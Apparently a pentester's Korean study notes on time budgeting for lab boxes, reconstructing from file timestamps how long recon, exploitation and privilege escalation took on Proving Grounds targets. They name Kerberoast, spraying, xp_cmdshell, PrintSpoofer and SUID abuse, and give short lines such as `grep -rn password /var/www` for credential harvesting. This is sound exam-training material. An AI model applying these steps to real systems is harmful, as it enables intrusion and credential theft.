실측([[Flimsy]]) — 21:22 시작 → 21:23:54 `-p-` 완료 → 21:25 APISIX 확인 → **21:28 user** → **21:33 root**. 전체 **약 11분**, 43500 확인 시점부터 root 까지 **8분**. 벡터 판단에 든 시간은 0이고 **태운 곳은 전부 정리 단계**임(gobuster 미종료 · `C-c` 로 셸 사망 · 라우트 삭제 미검증).
- **손절 기준** — `-p-` 를 다 보고도 알려진 취약 버전이 없으면 그때가 자격증명·웹 열거로 돌아갈 시점임
- **정리를 성공 직후에 할 것.** 시험 채점에는 안 들어가지만 실무 보고서에서는 「제거하지 못한 아티팩트」를 적어야 함(C-5). [[Flimsy]] 는 정리를 뒤로 미루다 셸을 잃어 **라우트 삭제 여부를 영영 검증하지 못했음**(A-32·A-33)

실측([[Jacko]], Intermediate, **1/2**) — **비율이 뒤집힌 전형.** 15:38 정찰 시작 → 15:50 익스플로잇 확보 → **16:10 타겟이 Kali 에서 파일을 받아감(= 코드 실행 확정)** → 17:04 셸 → 17:07 플래그 → 끝. **코드 실행까지 32분 / 거기서 셸까지 54분 / 셸을 잡은 뒤로는 3분.**
- 54분은 전부 **서빙 중인 파일 오인**에서 나옴(A-31 0단계)
- 권한상승에 쓴 시간이 **사실상 0** — 셸을 잡은 시점은 시험이라면 시간이 넉넉히 남은 지점이고, 거기서 접으면 플래그 하나짜리로 끝남. `whoami` 가 안 돌아 열거 자체를 못 한 것이 직접 원인임(A-3-11)
- **`whoami /all` 과 `C:\Program Files` 나열 두 가지에 최소 20분은 배정했어야 함**
- ⛔ **「셸을 잡았다」를 종료 신호로 쓰지 말 것.** 셸 획득은 시간 배분의 «후반 시작»임

실측([[Codo]]) — **Fundamental 난이도의 시계는 25~30분임.** 1시간을 넘으면 뚫리는 중이 아니라 잘못된 길에 있는 것임.

| 단계 | 적정 | 손절선 |
|---|---|---|
| nmap 전 포트 | 1~2분 | — |
| 웹 열거 + 관리 경로 발견 | 5분 | 10분 넘게 안 나오면 소스·문서로 경로 관례를 확인(B-1-36) |
| 기본 자격증명 시도 | 2분 | 10개 조합에서 안 되면 즉시 다른 공격면으로. 브루트포스로 넘어가지 말 것(B-1-37) |
| 업로드 → 웹셸 실행 | 10분 | 20분 넘으면 업로드 말고 테마 편집기·플러그인 경로로 갈아탈 것 |
| 설정 파일 열거 | 3분 | `grep -rn password /var/www` 는 30초면 끝남. 오래 걸릴 이유가 없음(A-41) |
| 재사용 시험 | 3분 | 계정 목록 전체를 훑고 안 되면 다음 후보로(B-6-12) |
| 총계 | 25~30분 | 1시간 초과 시 접근 자체를 재검토 |

**[[Codo]] 실측 — 총 33분 10초.** 파일 mtime · 스크린샷 파일명 · 셸 배너의 타겟 시각으로 재구성:

| 시각(KST) | 근거 | 무엇 |
|---|---|---|
| 16:02:41 | `nmap.log` 1행 | 스캔 시작 |
| 16:03:26 | `nmap.log` 마지막 행 | 스캔 종료(45.27초) |
| 16:24:49 | `~/PG/Codo/50978.py` mtime | `searchsploit -m 50978` — 제품 식별 + 관리 경로 발견 + `admin:admin` 로그인이 이 **21분** 안에 있음 `[가정]`(열거 산출물 없음) |
| 16:35:17 | `파일보관\Pasted image 20260818163517.png` | Global Settings 에 `payload.php` 물린 화면 |
| 16:35:51 | 셸 배너 `07:35:51`(타겟 UTC) + `up 36 min` | 리버스셸 회수 |

→ **21분 구간이 이 박스의 최대 항목**이고 그것이 통째로 미기록임. 실패한 열거 로그를 남겼으면 그대로 A 절 재료가 됐음(⚠️ `~/PG/Codo/` 에 파일이 `nmap.log`·`50978.py` **두 개뿐**, A-63).
→ 16:24:49 → 16:35:51 의 **11분**에 PoC 실행 시도(Burp 프록시 하드코딩으로 불발 `[가정]`, A-14)와 수동 업로드가 들어 있음.

실측([[Nagoya]], Advanced, **부분 1/2** — `proof.txt` 만, `local.txt` 미확보) — **AD 다단계 체인의 시간표 예시.** 전부 KST, 등급 표기: 실측=mtime·도구 타임스탬프 / 상한=스크린샷 붙여넣기 시각 / 역산=계산값.

nmap `-p-`(07-06 13:08–13:10, 131초) → ferox 3회(13:25/32/35, **전량 공전** A-1-23) → whatweb(13:32) → `names.txt`(13:52) → `users.txt` 405개(14:07) → **경로·아키텍처 헤매기 29분**(A-6-10) → kerbrute 26개 확정(14:36:30–14:38:49, 139초) → `valid_users.txt`(14:45) → `season_pass.txt`(14:55) → 스프레이 성공 craig.carr(~15:00, **추정**) → BloodHound(15:32) → Kerberoast→hashcat(15:55→15:56:13, 9초) → agent.exe 준비(16:55) → **약 17시간 30분 공백(하룻밤 중단)** → 07-07 ligolo 기동(~10:27:51, 역산) → 에이전트 접속(10:30:42, 로그 실측) → 터널 `start`(~10:31:02, 역산) → ccache 생성(10:39:08) → mssqlclient 접속(≤10:40:41, 상한) → xp_cmdshell(≤10:42:09, 상한) → PrintSpoofer 리버스셸(≤10:52:40, 상한) → `proof.txt`(≤10:56:21, 상한).

**실작업 약 4시간 15분**(07-06 3시간 47분 + 07-07 28분). 공백은 하룻밤 중단이라 작업 시간이 아님.
- **손절 지점 사례** — Kerberoast 로 깬 계정이 **어디에도 로그인이 안 되는 것을 확인한 직후**(15:56) 「그럼 이 해시를 뭐에 쓰지」로 전환했음. **로그인 시도를 30분 이상 붙들지 않은 것이 시간을 아꼈음**(A-52 → B-56)
- **경로가 보이고 나면 실행은 빠름** — ligolo 세팅부터 플래그까지 **28분**. 시간은 전부 「무엇을 할지 정하는 데」 듦
- ⚠️ **스크린샷 파일명 vs mtime 괴리** — 타겟 로그 타임스탬프(`2026-07-06T18:30:42-07:00`, UTC-7)를 KST 로 환산하면 07-07 10:30:42 인데 관련 스크린샷 파일명은 `20260707103620`(6분 뒤). **파일명 시각은 촬영이 아니라 볼트에 «붙여넣은» 시각**이라 사건의 **상한**으로만 쓸 것(A-64)

**「배제했다」와 「끝까지 못 해봤다」를 구분해 적을 것.** 섞이면 다음 사람이 닫힌 문으로 오독함. 시도 중에 끊긴 것은 **미완**이지 배제가 아님(A-68).
실측([[pyLoader]]) — Intermediate 인데 **전체 약 25분**(정찰 시작 `nmap.log` 10:45:55 → root 셸은 플래그 스크린샷 `Pasted image 20260629111100.png` 로 11:11:00 «이전», A-64). **권한상승 0분** — 정보 페이지에서 이미 root 를 확인했음(B-1-40).

| 단계 | 실측 | 권장 예산 | 초과 시 판단 |
|---|---|---|---|
| nmap 전수 스캔 | 54초 | 5분 | `--min-rate` 를 확인 |
| 서비스 식별 + 기본 자격증명 + 정보 페이지 | **~21분**(10:46→11:08) | 15분 | ★ **이 박스에서 가장 긴 구간임.** 기본 자격증명 3~4개가 안 통하면 즉시 pre-auth 익스플로잇 탐색으로 전환할 것. 브루트포스는 최후 수단(A-2-12) |
| 익스플로잇 확보(`git clone`) | 1초 미만 | 10분 | 공개 익스플로잇이 없으면 CVE 설명만으로 `curl` 을 손으로 조립 |
| 실행 → root 셸 → 플래그 | ~3분 | 10분 | 안 붙으면 A-31 계층 분리 |
| 권한상승 | 0분 | — | 정보 페이지에서 이미 root |
| (사후) `searchsploit -m 51532` | 11:12:16 | — | root 를 잡은 «뒤»의 참고 행위임. 시간 예산에 넣지 않음 |

→ **시간이 샌 곳은 익스플로잇이 아니라 「로그인 화면을 보고 인증부터 뚫으려 든 것」이었음**(A-1-11). 이 CVE 는 pre-auth 라 로그인이 통째로 불필요했음.

실측([[RubyDome]]) — Fundamental. 산출물 mtime 으로 **17:47:50 → 17:59:15 = 11분 25초.** 정찰 종료에서 **CVE 확정까지 1분 51초**(17:47:50 → 17:49:41).
```text
17:47:50  nmap.log / nmap.stdout   정찰 종료(29초 완주)
17:48:10  pop.py                   1차 익스플로잇 — 리터럴 공백, 실패
17:48:21  gobuster.txt (0B)        dirbust 시작(medium)
17:48:40  test.py                  오라클 프로버 작성
17:48:55  pdfkit-0.8.6.gem         gem 원본 확보
17:49:01  gemsrc/                  전개 → source.rb 로 %20 스위치 확인
17:49:41  err.html                 실패 응답 저장 = 명령행에 %60 확인
17:52:08  rev.py                   2차 — {echo,X} brace expansion
17:52:43  rev2.py                  3차 — ruby TCPSocket 원라이너
17:54:47  rd.sh                    4차 — curl --data-urlencode + base64 → 성공
17:59:15  gobuster_common.txt (0B) common.txt 실행분 종료(root 획득 이후)
```
— 출처: `~/PG/RubyDome/` 파일 mtime

**태운 곳은 익스플로잇 «형태» 3회 재시도(17:48:10 → 17:54:47, 약 6분 37초)이고 «벡터 판단»이 아니었음.** 취약점은 2분 만에 확정됐음. [[CVE-2023-46818]] 과 같은 교훈 — **막히면 「벡터」를 바꾸기 전에 페이로드 「형태」부터 의심할 것**(A-2-30).
⚠️ `common.txt` dirbust 는 root 획득 «후»에 끝났음 — 백그라운드 사후 확인이지 이 박스를 붙들고 있던 구간이 아님. 「dirbust 에 11분을 태웠다」로 읽지 말 것.
⚠️ 원 노트는 **「12분」**·「정찰에서 CVE 확정까지 2분」으로 적었으나 정확히는 **11분 25초**·**1분 51초**임 — 재실측으로 정정함.

**권장 상한** `[가정]`([[RubyDome]] 골격) — 위 실측과 별개로 예산 감각을 위해 제시하는 값임:

| 단계 | 상한 | 초과 시 |
|---|---|---|
| nmap `-p-`(`--min-rate 5000`) | 3분 | 그대로 진행 |
| 웹 초기 탐색(폼·헤더·의도적 500) | 10분 | 백트레이스가 나왔다면 이미 CVE 확정 단계임(B-1-41) |
| 디렉터리 열거 | 10분 | `X-Cascade: pass` 를 봤다면 **0분 — 시작하지 않음**(A-16) |
| CVE 확인 → PoC 조립 | 20분 | `sleep` 검증이 먼저. 30분 넘으면 페이로드 «인코딩»을 의심(A-2-30) |
| 셸 획득 후 `sudo -l` 까지 | 5분 | 표준 5개 명령이면 충분(C-2) |
| 권한상승 | 15분 | `ls -la` 한 줄로 답이 보이는 유형(A-43) |

**손절선 — 「웹앱이 안 보인다」에서 SMB·SMTP·FTP 로 새는 경우**([[Butch]]):

| 상황 | 손절선 |
|---|---|
| SMB null session 이 `NT_STATUS_ACCESS_DENIED` | **5분.** 자격증명 없이 더 볼 것 없음 |
| SMTP `VRFY` 로 사용자 이름을 얻었는데 쓸 곳이 없음 | **10분.** 사용자명만으로는 진전 없음 — 웹으로 돌아갈 것 |
| FTP 익명 로그인 실패 | **3분** |
| 웹앱이 안 보임 | 전 포트 스캔 결과를 **다시 읽을 것.** 재스캔이 아니라 읽기가 답인 경우가 많음(A-1-15) |

**원칙 — 열거 결과가 다음 «행동»으로 이어지지 않으면 그 갈래는 죽은 것임.** 사용자명 목록은 그 자체로 진전이 아니고, **붙여볼 인증 지점이 있어야** 진전임.

**시간 배분 기준선 — 웹 → SQLi → 업로드 → WinRM 유형은 60~90분**([[Butch]]):

| 단계 | 목표 | 초과 시 |
|---|---|---|
| 전 포트 스캔 + 서비스 식별 | 10분 | — |
| 웹 열거(feroxbuster + 소스 읽기) | 20분 | 확장자 세트를 넓혀 재실행(A-1-20) |
| SQLi 탐지 → 인증 우회 | 20분 | `xp_cmdshell` 경로로 전환(B-1-43), 또는 FTP·SMTP 갈래 |
| 업로드 → 웹셸 | 15분 | 확장자 사다리를 끝까지(B-1-42) |
| 권한상승 → 플래그 | 15분 | `whoami /priv` 재확인, **토큰 필터링 의심**(A-4-15) |

⚠️ **폼 자동화에 5분 이상 들어가면 손으로(브라우저로) 넘어갈 것.** [[Butch]] 는 WebForms `__VIEWSTATE`·`__EVENTVALIDATION` 파싱을 자동화하지 않고 브라우저로 진행했고 그 판단이 옳았음(스크린샷 6장이 그 기록). **회당 1~2회만 칠 요청이면 자동화의 손익분기점을 못 넘김** — 반복 수십 회부터가 자동화 구간임.

실측([[Crane]]) — 웹 제품 + post-auth CVE + `sudo -l` GTFOBins 골격의 손절선:

| 단계 | 적정 시간 | 손절 신호 |
|---|---|---|
| nmap `-p-` | ~1분 | `--min-rate` 없이 10분을 넘기면 즉시 중단하고 다시 걸 것 |
| 버전 확정 | ~5분 | 비인증 엔드포인트·README·헤더·푸터 중 2개로 교차되면 끝(B-1-29) |
| `/install.log` 등 인스톨러 잔존물 조사 | **5분 상한** | 로그에 자격증명이 없고 잠금 플래그가 걸린 것을 확인하면 즉시 접을 것(A-2-31) |
| 디렉터리 브루트 결과 정독(1085행) | **하지 말 것** | **제품이 특정된 뒤에는 브루트포스 결과의 가치가 급락함** |
| CVE 검색 → PoC 확보 | ~10분 | `searchsploit` 이 비면 즉시 CVE 검색으로 전환(A-1-11) |
| 익스플로잇 발사 후 대기 | **30초** | 그 안에 **리스너**를 확인할 것. 스크립트를 쳐다보며 기다리지 말 것(A-12) |
| `sudo -l` → GTFOBins | ~2분 | 항목이 있으면 끝. 없으면 SUID·cap·cron 으로 즉시 이동 |

[[Crane]] 의 이론상 최소 시간은 15분 안쪽. **시간이 새는 곳은 ① searchsploit 오독 ② 「행」 착시 둘뿐이고 둘 다 판단 착오이지 기술 부족이 아님.**


---

**실측 — 박스별 소요 시간과 손절점**

| 박스 | 실측 | 무엇이 시간을 먹었나 |
|---|---|---|
| [[BossPlayersCTF]] | 정찰 15:58:59 → root 16:03:20 = **4분 20초** | Fundamental 기준선. 이보다 훨씬 오래 걸리면 정적 열거에 매몰된 것 — 워드리스트 열거가 10분을 넘기면 응답 본문(HTML 주석·메타데이터)부터 재검토(A-16) |
| [[Internal]] | 첫 셸 5분(00:52:48→00:57:33), **실제 플래그 회수 02:04 = 총 1시간 12분** | 손실 전부가 **「첫 셸에서 플래그를 안 읽은 것」**에서 파생. 커널 익스플로잇 계열은 콜백 즉시 목표부터 칠 것(B-24) |
| [[Cobbles]] | 로그인 폼에만 **약 2.5시간** | 비밀번호 브루트(2.13M 무히트)·리버스프록시 헤더 미끼(`x-backend-server` 는 완전 정적)·request smuggling/traversal(CVE-2023-25690·2021-41773/42013 전부 부정) — **셋 전부 진짜 앱(`/zm-prod/`)에 도달조차 못 한 상태**에서 벌인 것 |
| [[GLPI]] | 순차 프로빙 **9분 41초** / 전체 27분 15초 | 후보군이 유한한데 순차로 돈 것. 배치로 쏘면 한 번에 끝남 |
| [[Fikklish]] | 진입까지 **53분** / 진입 후 root 까지 **9분** | 메일 가로채기 **27분**(아웃바운드 0을 5분에 읽었어야 함) · 락아웃 회피 45분. **진입 뒤는 9분짜리 박스** |
| [[Cockpit]] | 브루트에 **4시간 반** / 정답 경로는 **20분** | catch-all 재귀 폭주(A-1-13)와 차단 오인(A-1-14). 인증 뒤 관리 콘솔은 브루트 대상이 아님 |
| [[Outdated]] | 전체 **12분** (user 4분) | 발화 조건 5분이 유일한 손실. 응답 본문을 안 읽은 것이 원인(A-15) |
| [[ClamAV]] | RCE 확정 **2분 43초** / 셸까지 **10분 12초 더** | 전부 채널 제약(대소문자·길이·cwd, A-39). 도구 인벤토리를 먼저 돌렸으면 3분 28초짜리였음 |
| [[Monster]] | 정찰~CMS 특정 **5분** / 크리덴셜까지 **27분** / RCE~셸 **8분** — **root 는 미완(`1/2`)** | 크리덴셜 구간이 전체의 3분의 2. 그중 **15분이 캡차 삽질**(A-2-25) — 소스가 손에 있는데 픽셀부터 셌음 |
| [[Zipper]] | feroxbuster **19분** + polkit 선행 시도 **약 19분** `[가정]` | 확장자에 `php` 를 안 넣어 `upload.php` 미탐지(A-1-20) · 열거 전에 범용 CVE 를 던짐(A-4-12). **정답은 5개 반사 명령의 다섯 번째** |
| [[Fowsniff]] | 정찰 14:53 → root **15:05 = 약 12분** | 이미지 스테가노 **5분**이 유일한 손실. 정적 웹은 15분에 접을 것(A-1-21·A-1-22) |
| [[Flimsy]] | 정찰 21:22 → user 21:28 → root **21:33 = 11분** | 벡터 판단에 든 시간 0. 태운 곳은 전부 **정리 단계**(gobuster 미종료 · `C-c` 로 셸 사망 · 라우트 삭제 미검증) |
| [[Jacko]] | 코드 실행 **32분** / 셸까지 **54분 더** / 셸 뒤로는 **3분** — **1/2** | 54분은 서빙 중인 파일 오인(A-31 0단계). **비율이 뒤집힘** — 셸을 잡은 뒤 `whoami` 가 안 돌아 열거를 통째로 접었음(A-3-11) |
| [[Codo]] | 정찰 16:02 → 셸 **16:35 = 33분 10초** | **21분이 미기록 구간**(제품 식별~로그인). 실패 로그를 안 남겨 그 구간이 통째로 재료가 못 됨(A-63) |
| [[Nagoya]] | 실작업 **약 4시간 15분**(하룻밤 공백 제외) — **1/2** | ferox 3회 공전 10분(A-1-23) · 도구 경로·아키텍처 헤매기 **29분**(A-6-10) · 인용부호 지옥 4회(A-3-12). **경로가 정해진 뒤 ligolo→플래그는 28분** |
| [[PwnLab]] | 진입 후 root 까지 3단(kane→mike→root) | 순손실은 **tmux 별칭 실패를 10분간 모른 것** 하나(A-1-10). 소스를 먼저 읽어 SQLi 20분을 아꼈고(A-25), www-data 시점 SUID 열거를 결론으로 믿을 뻔했음(A-41) |
| [[PlanetExpress]] | docroot 브루트 **3분** + 아웃바운드 오독 **8분** | 오독의 원인은 **stdout/stderr 버퍼링으로 줄 순서가 뒤섞인 것**(A-31). 제일 값비쌌던 것은 `#!/bin/sh` 하이재킹의 **조용한 실패**(B-33) |
| [[pyLoader]] | 정찰 10:45:55 → root **11:11 이전 = 약 25분** | 최대 구간이 익스플로잇이 아니라 **서비스 식별+로그인 ~21분**. pre-auth CVE 라 로그인이 통째로 불필요했음(A-1-11) |
| [[RubyDome]] | 정찰 17:47:50 → 마무리 17:59:15 = **11분 25초** | CVE 확정까지 **1분 51초**. 태운 6분 37초는 전부 페이로드 «형태» 3회 재시도(A-2-30) — 벡터 판단이 아니었음 |
| [[Butch]] | 웹 → SQLi → 업로드 → WinRM(기준선 60~90분) | ⚠️ **mtime 기반 실측 없음**(`~/.zsh_history` 에 타임스탬프 미설정) — 위 기준선은 `[가정]`. 토큰 필터링 오판은 20~30분짜리 함정(A-4-15) |
| [[Crane]] | 이론상 최소 **15분 안쪽** | 새는 곳 둘뿐 — ① `searchsploit` 0건을 「없음」으로 오독(A-1-11) ② 「행」 착시(A-12). **둘 다 판단 착오이지 기술 부족이 아님** |
| [[MiddlewareBypass]] | nmap 종료 10:11:19 → whatweb 10:22 → `52124.txt` 10:35:47 → PoC 준비 10:41:29~10:44:29 = **최소 33분** | ⚠️ SSH root 로그인·플래그 시각은 mtime 근거 없음 `[가정]`. 특정 가능한 유일한 손실 지점은 **feroxbuster auto-filter 가 `/admin` 을 숨긴 구간**(A-15) |
| [[Squid]] | `pscan.sh` 18:23 → nmap 18:25 → 프록시 포트 열거·gobuster **3분** → 웹셸 18:30 → 권한상승 준비 18:32~18:38(**6분**) = **15분** | 가장 긴 구간이 익스플로잇이 아니라 **권한상승 페이로드 준비 6분**(443→4444 포트 전환 포함, A-31). 정찰~내부 포트 확정은 5분 안 |
| [[Pelican]] | 10:30 nmap → 10:40 Exhibitor UI → 10:46 페이로드 → 10:48 RCE + user → 11:07 root = **37분** | 최장 구간은 **제품 식별 9분**(10:31→10:40, B-2-15), 다음이 권한상승 열거 18분. 막힘이 적었던 것은 실력이 아니라 **nmap 이 진입 URL 을 통째로 준 것**(A-1-27) |
| [[Sorcerer]] | 커널 익스플로잇 컴파일 14:54~14:56 → 15분 뒤 SUID 로 root | 정답은 `find / -perm -4000` 한 줄이었고 **컴파일이 그보다 100배 길었음**(B-24). `scp` 가 안 되는 원인을 `man scp` 에서 찾기까지의 구간도 손실(A-37) |

**공통 패턴** — 시간을 먹는 것은 어려운 단계가 아니라 **틀린 층에서 헤매는 것**이다. 위 사례 대부분이 「진짜 공격면에 도달하지도 못한 채」 태운 시간이다.

⚠️ **이 표는 웨이브마다 늘어난다. 「위 넷 중 셋」처럼 «개수를 세는» 문장을 쓰지 마라** — 행이 추가되는 순간 조용히 틀린 말이 된다(실측: 4행 기준으로 쓴 문장이 17행이 될 때까지 남아 있었다).

**[[Astronaut]](Fundamental) 배분 — 목표선 약 30분:**

| 단계 | 적정 시간 | 손절 기준 |
|---|---|---|
| Nmap `-p-` | 3분 | 백그라운드로 돌리고 다음 진행 |
| CMS 식별 + 버전 판정 | **10~15분** | **근거 2개가 일치하면 즉시 익스로.** 3개는 사치임 |
| `searchsploit` + CVE 읽기 | 5분 | — |
| 익스 실행 + **대기** | **최소 2분** | **2주기를 기다리기 전에는 절대 실패로 판정하지 않음** |
| 권한상승 열거 | 3분 | `find -perm -4000` 에서 비표준이 나오면 끝. 안 나오면 커널·크론·`sudo -l` |

⛔ **익스플로잇 후 «판정 시한»을 경로 유형별로 미리 정해 둘 것:**

| 유형 | 최소 대기 |
|---|---|
| 인라인 RCE(웹셸·명령 주입) | 5초 |
| **크론·스케줄러** | **2주기**(60초 주기면 120초) |
| 이메일·큐 트리거 | 5분 |
| 관리자 시뮬레이션(XSS) | 15분 |

⚠️ **두 신호가 «같은 방향»을 가리키면 확신을 갖고 틀림.** [[Astronaut]] 은 ①응답이 로그인 페이지(실패처럼 보임) ②셸이 즉시 안 붙음 — 둘 다 실패 신호라 30초쯤에 다른 경로를 파기 시작하면 60초에 붙은 셸을 놓침.
```text
t=0s   익스 실행 → 로그인 페이지 200        "실패 같은데?"
t=5s   리스너 조용                          "역시 실패네"
t=30s  다른 경로 탐색 시작                  ← 여기서 박스를 놓침
t=60s  (셸이 붙었지만 이미 다른 창을 보고 있음)
```
→ **판정의 정확도를 높이는 것보다 「틀렸을 때 빨리 알아채는 구조」를 만드는 것이 시험에서는 더 쌈.** 여기서는 그게 **「리스너를 tmux 에 띄워 두고 다음 작업으로 넘어가기」**(B-89) 였음.

실측([[Vault]]) — **실제 작업 시간은 약 1시간인데 산출물 mtime 사이에 큰 공백이 둘 있음:**

| 구간 | 실제 | 근거 |
|---|---|---|
| nmap TCP `-p-` | 09:15:26 → 09:17:38 (131초) | `nmap.log` |
| **nmap → UDP 사이 공백** | 09:17:38 → 10:15:26 (**58분**) | 두 파일 mtime. `smbclient` 문법 헤매기·IP 오타(.175)·AS-REP·LDAP 헛발질이 이 구간 |
| UDP top-100 | 10:15:26 → 10:15:30 (3.4초) | `udp.txt` |
| 미끼 생성 → 해시 회수 | 10:22:16 → 10:28:29 (**6분**) | `~/git/ntlm_theft/steal` mtime · `hash.txt` mtime |
| 해시 → `local.txt` | → 10:49:42 | 스크린샷 파일명 |
| **`local.txt` → BloodHound 수집 공백** | 10:49 → 12:49 (**2시간**) | JSON mtime. 산출물에 흔적이 없어 재구성 불가 `[가정]` |
| BloodHound → GPO 성공 | 12:49:27 → 13:20:07 (31분) | JSON mtime · 스크린샷 |
| GPO → `proof.txt` | → 13:23:20 (3분) | 스크린샷 |
| 두 번째 경로(utilman·RDP) | → 13:40:45 | 스크린샷 |

**낭비 구간 둘(58분·2시간)은 산출물에 흔적이 없어 무엇을 했는지 재구성할 수 없음** — 「출력을 파일로 남기지 않으면 사후에 못 쓴다」의 사례임(A-18 · A-64).
⚠️ **이전 판 [[Vault]] 노트의 시간 배분표는 재실측과 달랐음** — 「nmap TCP+UDP 09:15 → 10:15」를 한 구간으로 묶고 「전체 약 1.5시간, 낭비는 둘 다 5분 이내」로 적었으나 **「낭비가 5분뿐」은 반증됨.**

실측([[Kevin]]) — 산출물이 남아 있지 않아 mtime 재구성이 불가하고 **확정된 수치는 nmap `111.97초` 하나임**(스캔 출력 자체에 기록됨). 나머지는 노트 본문에 남은 구간 평가임:

| 구간 | 소요 | 평가 |
|---|---|---|
| nmap 전수 스캔 | 111.97초 | 🟡 `--min-rate 5000` 을 붙였으면 절반. [[Twiggy]] 는 같은 전수 스캔이 53초였음 |
| 제품 식별(GoAhead + HP Power Manager) | 즉시 | ✅ `-sC` 의 `http-title` 이 제품명을 바로 줌 |
| 익스플로잇 검색 → PoC 확보 | 빠름 | ✅ 제품명이 완전히 특정되는 이름이라 검색이 쉬웠음 |
| 셸코드 생성·이식 | — | 🟡 명령에 결함 3건(A-14). 결과적으로 통했으나 **재현성이 없음** |
| 익스플로잇 실행 → SYSTEM | 30초 대기 포함 1회 성공 | ✅ |
| 권한상승 | 불필요 | ✅ |

**에그헌터 방식의 손절선** — PoC 기본이 `time.sleep(30)` 이고 저자가 60초까지 올리라고 적었음. **90초를 넘겨도 안 붙으면 대기 시간 문제가 아님**(A-3-15). 익스플로잇을 세 번 던져서 안 되면 **취약 서비스가 죽었을 가능성**을 확인할 것(`nmap -p<포트>` 재스캔). `EXITFUNC=thread` 가 그걸 막아 주지만 실패한 시도가 프로세스를 죽였을 수 있음(A-31).


**[[plum]](Intermediate, 총 1시간 48분)** — 전부 산출물 mtime · 스크린샷 파일명 · 메일 로그(타임존 환산)로 뒷받침됨.

| 단계 | 실측 | 권장 예산 | 초과 시 판단 |
|---|---|---|---|
| nmap + 웹 열거 + 기본 자격증명 | 15분 (12:41:58→12:56:42) | 20분 | 진단/Information 페이지를 먼저 찾을 것 |
| 익스플로잇 확보 → 셸 | 4분 (12:56:42→13:00:31) | 15분 | 안 통하면 브루트포스 전에 공개 익스플로잇 탐색 |
| **권한상승 전체** | **89분** (13:00:31→14:29:47) | 30분 | ★ 여기서 샘 |
| └ 기록 없는 구간 | 57분 (13:00:31→13:57:06) | — | ★★ 가장 큰 손실이자 **원인 미상** |
| └ `sudo -l` ×2 → `local.txt` → SUID 열거 → `46996` 확보 | 27분 (13:57:06→14:23:56) | 10분 | `sudo -l` 은 한 번 실패하면 접을 것 |
| └ exim 익스플로잇 확보~폐기 | 5분 (14:23:56→14:28:56) | 0분 | 버전을 먼저 봤다면 확보조차 안 했음(A-13) |
| └ 메일함 → root | 51초 (14:28:56→14:29:47) | 5분 | 정답을 찾은 뒤에는 60초 |

**시간을 잡아먹은 것은 exim 익스플로잇이 아님.** 「SUID `exim4` 를 보고 삽질하느라 오래 걸렸다」는 서사를 타임스탬프가 반증함 — `46996` 확보(14:23:56)는 root 획득(14:29:47) **6분 전**임. **실제 손실은 13:00~13:57 의 57분, 무엇을 했는지 산출물에 남지 않은 구간임.**
→ 손절 교훈이 두 겹임. ⑴ **버전 확인은 익스플로잇 확보보다 먼저**(10초짜리 `dpkg -l | grep exim` 이 5분과 오판을 없앰) ⑵ **열거는 파일로 남기면서 할 것** — 57분을 어디에 썼는지 모르면 개선할 수 없음(A-64).
⚠️ 하위 항목의 합(57+27+5+1)이 상위 89분과 맞는지 확인하고 적을 것 — **소계가 안 맞는 시간표는 그 자체로 서술이 틀렸다는 신호임.**


**[[Flu]] 실측 — foothold 30분은 훌륭했고, 실패는 속도가 아니라 «배분»이었음.**

| 구간 | 1차 세션 (2026-07-14) | 2차 세션 (2026-08-20) |
|---|---|---|
| nmap `-p-` | 13:51–13:53 (129초) | 13:48–13:50, 결과 동일 |
| 버전 판정 → 익스플로잇 확보 | 13:53–14:06 (~13분) | 0분 (1차의 클론 재사용) |
| Foothold | 14:06–14:20 (~14분) | ~1분 (같은 명령, IP 만 교체) |
| 권한상승 | 사실상 0분 — 미완 | 04:50–04:54 UTC, 약 5분 |

1차의 실패는 **웹 익스플로잇을 더 찾는 데 쓴 시간을 로컬 열거에 썼어야 했다**는 것임(A-41).

**시험용 배분으로 옮기면:**
- foothold 60분 · 권한상승 60분 · 총 120분에서 손절
- 권한상승 **첫 5분**은 한 줄짜리 반사 명령에 쓸 것(C-2). **여기서 끝나는 박스가 실제로 많음**
- 다섯 개가 다 빈손이면 **다음 10분은 `find / -writable` · `find / -user root -perm -o+w` · `ps aux` · `ss -lntup`**
- 그래도 없으면 그때 `linpeas` 를 올릴 것. **순서를 뒤집지 말 것** — linpeas 출력 2000줄을 읽는 것보다 `id` 한 줄이 빠름


**[[Algernon]] — 성공 경로 약 9분(10:59:00 빠른 스캔 → 11:08 플래그), 태운 시간의 대부분은 인프라 실수를 알아채는 데 들어감.**

| 구간 | 실제 | 손절선 |
|---|---|---|
| 빠른 스캔(10:59:00 → 10:59:01) | 1.3초 | — |
| 전수 스캔(`-p-`, 208초) | 3.5분 | 백그라운드로 돌리고 기다리지 않음. **익스플로잇이 전수 스캔이 끝나기 전에 완료됨** |
| 제품·버전 식별(9998) | 약 2분 | 10분. 넘어가면 다른 포트로 |
| 익스플로잇 확보·수정(`searchsploit` → diff) | 약 1분 | 15분 |
| 리스너 준비 + 발사 + 셸 | 약 5분 | 20분. 넘으면 원인 격리 절차(A-12)로 |
| 플래그 확인 | 약 3분 | 10분. `local.txt` 전역 검색은 하지 않음(C-3) |
| 합계 | 약 10분 | 1시간 |

원칙 셋:
1. **전수 스캔을 기다리지 말 것.** 빠른 스캔(1.3초)으로 나온 포트에서 즉시 작업을 시작하고 `-p-` 는 백그라운드에. 이 박스는 실제로 전수 스캔이 끝나기 전에 SYSTEM 을 잡았음
2. **버전이 확정된 «다음»에 익스플로잇을 찾을 것.** 순서를 뒤집으면 「익스플로잇에 맞는 버전을 찾는」 확증 편향에 빠짐(A-13)
3. **인프라 준비에 5분 이상 쓰고 있으면 뭔가 잘못된 것.** 리스너 하나 띄우는 데 시간이 걸린다면 도구 문제가 아니라 절차 문제임(A-31 · A-33)

⚠️ 위 구간 시각은 산출물 mtime 과 nmap 로그 타임스탬프로 재구성한 것이고(`nmap_quick.log` 10:59:01 · `nmap.log` 11:05:40 · `nmap_lowrate_crosscheck.log` 11:08:08 · `shell_session.log`·스크린샷 11:08:50), **개별 구간의 「약 N분」은 원 노트의 자기 신고 값임**(A-64).


**AD 박스 기준선 — 정찰 10분 · 진입 30분 · 그래프 15분 · 권한상승 30분.** 웹 브루트포싱은 백그라운드로만 돌리고 그것을 기다리지 않는다(A-23). 진입 경로가 60분 넘게 안 보이면 다른 박스로 옮겼다가 돌아온다.

[[Heist]] 실측 복기 (전체 약 2시간, 근거 = `~/PG/Heist/` mtime + 스크린샷 파일명):

| 구간 | 실제 | 적정 | 비고 |
|---|---|---|---|
| nmap 전수 | 13:56 → 13:58 (2분) | 2분 | `--min-rate 5000` 의 효과 |
